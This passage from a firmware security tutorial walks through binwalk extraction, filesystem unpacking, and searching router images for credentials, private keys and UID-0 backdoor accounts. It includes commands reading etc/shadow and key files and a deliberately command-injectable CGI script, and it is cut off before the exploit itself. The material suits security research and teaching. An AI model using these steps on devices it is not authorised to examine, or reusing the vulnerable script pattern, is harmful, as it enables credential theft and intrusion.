class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 28            0x1C            LZMA compressed data</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 1048576       0x100000        Squashfs filesystem, little endian, version 4.0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 5242880       0x500000        JFFS2 filesystem, little endian</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Entropy analysis (detect encryption):</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">binwalk </span><span class="token parameter variable" style="color:#36acaa">-E</span><span class="token plain"> firmware.bin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># High entropy (close to 1.0) = encrypted or compressed</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Low entropy = uncompressed data</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Strings analysis (look for clues):</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">strings firmware.bin </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">grep</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-i</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;version\|copyright\|password\|root&quot;</span><br></span></code></pre></div></div>
<p><strong>Identify architecture:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Look for ELF binaries in firmware (after extraction):</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">file</span><span class="token plain"> bin/busybox</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Output: ELF 32-bit LSB executable, MIPS, MIPS32 rel2 version 1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Common embedded architectures:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># - ARM (32-bit: ARMv7, 64-bit: ARMv8/AArch64)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># - MIPS (32-bit: MIPS32, 64-bit: MIPS64)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># - PowerPC (PPC)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># - x86/x64 (less common in embedded)</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="firmware-unpacking">Firmware Unpacking<a href="#firmware-unpacking" class="hash-link" aria-label="Direct link to Firmware Unpacking" title="Direct link to Firmware Unpacking" translate="no">​</a></h3>
<p><strong>Automated unpacking with binwalk:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Extract all embedded files/filesystems:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">binwalk </span><span class="token parameter variable" style="color:#36acaa">-e</span><span class="token plain"> firmware.bin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Output directory: _firmware.bin.extracted/</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Contains extracted filesystems, compressed data, etc.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Navigate to extracted filesystem:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">cd</span><span class="token plain"> _firmware.bin.extracted/squashfs-root/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">ls</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-la</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Output: bin/ etc/ lib/ sbin/ usr/ var/ www/</span><br></span></code></pre></div></div>
<p><strong>Manual unpacking (if binwalk fails):</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Example: SquashFS at offset 0x100000</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Extract with dd and unsquashfs:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">dd</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">if</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">firmware.bin </span><span class="token assign-left variable" style="color:#36acaa">bs</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">skip</span><span class="token operator" style="color:#393A34">=</span><span class="token variable" style="color:#36acaa">$((</span><span class="token variable number" style="color:#36acaa">0x100000</span><span class="token variable" style="color:#36acaa">))</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">of</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">filesystem.squashfs</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">unsquashfs filesystem.squashfs</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Output: squashfs-root/</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Example: JFFS2 filesystem</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">dd</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">if</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">firmware.bin </span><span class="token assign-left variable" style="color:#36acaa">bs</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">skip</span><span class="token operator" style="color:#393A34">=</span><span class="token variable" style="color:#36acaa">$((</span><span class="token variable number" style="color:#36acaa">0x500000</span><span class="token variable" style="color:#36acaa">))</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">of</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">filesystem.jffs2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Mount JFFS2 (requires mtd-utils):</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> modprobe mtdblock</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> modprobe mtdram </span><span class="token assign-left variable" style="color:#36acaa">total_size</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">32768</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">erase_size</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">256</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">dd</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">if</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">filesystem.jffs2 </span><span class="token assign-left variable" style="color:#36acaa">of</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">/dev/mtdblock0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">mount</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-t</span><span class="token plain"> jffs2 /dev/mtdblock0 /mnt/jffs2</span><br></span></code></pre></div></div>
<p><strong>Handling encrypted firmware:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Encryption detection:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">binwalk </span><span class="token parameter variable" style="color:#36acaa">-E</span><span class="token plain"> firmware.bin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># High entropy across entire file = likely encrypted</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Decryption strategies:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 1. Find decryption key in device memory (UART shell, if available)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 2. Reverse firmware update process (find decryption routine in bootloader/updater)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 3. Extract key from device flash (may be stored separately)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 4. Hardware attacks (fault injection, side-channel analysis)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Example: Find AES key in memory dump</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">strings memory_dump.bin </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">grep</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-E</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;^[0-9a-fA-F]{32}$&quot;</span><span class="token plain">  </span><span class="token comment" style="color:#999988;font-style:italic"># 128-bit AES key (hex)</span><br></span></code></pre></div></div>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="filesystem-extraction">Filesystem Extraction<a href="#filesystem-extraction" class="hash-link" aria-label="Direct link to Filesystem Extraction" title="Direct link to Filesystem Extraction" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="analyzing-extracted-filesystem">Analyzing Extracted Filesystem<a href="#analyzing-extracted-filesystem" class="hash-link" aria-label="Direct link to Analyzing Extracted Filesystem" title="Direct link to Analyzing Extracted Filesystem" translate="no">​</a></h3>
<p><strong>Key directories in embedded Linux:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Navigate to extracted filesystem:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">cd</span><span class="token plain"> squashfs-root/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Directory structure:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">bin/        </span><span class="token comment" style="color:#999988;font-style:italic"># Essential binaries (busybox, sh)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sbin/       </span><span class="token comment" style="color:#999988;font-style:italic"># System binaries (init, ifconfig)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">etc/        </span><span class="token comment" style="color:#999988;font-style:italic"># Configuration files (passwd, shadow, init scripts)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">lib/        </span><span class="token comment" style="color:#999988;font-style:italic"># Shared libraries (libc, libpthread)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">usr/        </span><span class="token comment" style="color:#999988;font-style:italic"># User programs and libraries</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">var/        </span><span class="token comment" style="color:#999988;font-style:italic"># Variable data (logs, tmp files)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">www/        </span><span class="token comment" style="color:#999988;font-style:italic"># Web server files (HTML, CGI scripts)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dev/        </span><span class="token comment" style="color:#999988;font-style:italic"># Device files (usually empty in filesystem image)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">proc/       </span><span class="token comment" style="color:#999988;font-style:italic"># Process info (mounted at runtime)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">tmp/        </span><span class="token comment" style="color:#999988;font-style:italic"># Temporary files</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="searching-for-sensitive-information">Searching for Sensitive Information<a href="#searching-for-sensitive-information" class="hash-link" aria-label="Direct link to Searching for Sensitive Information" title="Direct link to Searching for Sensitive Information" translate="no">​</a></h3>
<p><strong>Hardcoded credentials:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Search for passwords in configuration files:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">grep</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-r</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;password\|passwd\|pwd&quot;</span><span class="token plain"> etc/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Common files with credentials:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">cat</span><span class="token plain"> etc/passwd        </span><span class="token comment" style="color:#999988;font-style:italic"># User accounts</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">cat</span><span class="token plain"> etc/shadow        </span><span class="token comment" style="color:#999988;font-style:italic"># Password hashes (if present)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">cat</span><span class="token plain"> etc/config/*      </span><span class="token comment" style="color:#999988;font-style:italic"># Vendor-specific config files</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Example (TP-Link router):</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">cat</span><span class="token plain"> etc/config/account</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># username=admin</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># password=21232f297a57a5a743894a0e4a801fc3  (MD5 hash of &quot;admin&quot;)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Search for API keys, tokens:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">grep</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-r</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;api_key\|token\|secret&quot;</span><span class="token plain"> etc/ www/</span><br></span></code></pre></div></div>
<p><strong>Backdoor accounts:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Check for hidden admin accounts:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">cat</span><span class="token plain"> etc/passwd </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">grep</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-v</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;^#&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Example backdoor:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># debug:x:0:0:Debug User:/root:/bin/sh  (UID 0 = root)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Check for SSH authorized_keys:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">find</span><span class="token plain"> </span><span class="token builtin class-name">.</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-name</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;authorized_keys&quot;</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-exec</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">cat</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">\</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<p><strong>Encryption keys:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Search for SSL/TLS private keys:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">find</span><span class="token plain"> </span><span class="token builtin class-name">.</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-name</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;*.pem&quot;</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-o</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-name</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;*.key&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Example:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">cat</span><span class="token plain"> etc/ssl/private/server.key</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># -----BEGIN RSA PRIVATE KEY-----</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># ...</span><br></span></code></pre></div></div>
<p><strong>Configuration files:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Web server config:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">cat</span><span class="token plain"> etc/httpd.conf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">cat</span><span class="token plain"> etc/lighttpd/lighttpd.conf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Telnet/SSH config:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">cat</span><span class="token plain"> etc/inetd.conf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">cat</span><span class="token plain"> etc/dropbear/dropbear_rsa_host_key</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Wireless config (routers):</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">cat</span><span class="token plain"> etc/config/wireless</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Contains WiFi passwords, security settings</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="web-application-files">Web Application Files<a href="#web-application-files" class="hash-link" aria-label="Direct link to Web Application Files" title="Direct link to Web Application Files" translate="no">​</a></h3>
<p><strong>Analyzing web interfaces:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Web root (common locations):</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">cd</span><span class="token plain"> www/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># or</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">cd</span><span class="token plain"> usr/www/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># or</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">cd</span><span class="token plain"> home/httpd/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Identify web server:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">ps</span><span class="token plain"> aux </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">grep</span><span class="token plain"> httpd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Common embedded web servers: lighttpd, boa, goahead, thttpd</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Analyze CGI scripts (common vulnerability source):</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">find</span><span class="token plain"> www/ </span><span class="token parameter variable" style="color:#36acaa">-name</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;*.cgi&quot;</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-o</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-name</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;*.sh&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Example CGI script:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">cat</span><span class="token plain"> www/cgi-bin/login.cgi</span><br></span></code></pre></div></div>
<p><strong>CGI command injection example:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Vulnerable CGI script (login.cgi):</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">#!/bin/sh</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token assign-left variable" style="color:#36acaa">USERNAME</span><span class="token operator" style="color:#393A34">=</span><span class="token variable" style="color:#36acaa">$1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token assign-left variable" style="color:#36acaa">PASSWORD</span><span class="token operator" style="color:#393A34">=</span><span class="token variable" style="color:#36acaa">$2</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Vulnerable: unsanitized input passed to system command</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/bin/check_password </span><span class="token variable" style="color:#36acaa">$USERNAME</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$PASSWORD</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Exploitation (command injection via username parameter):</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span 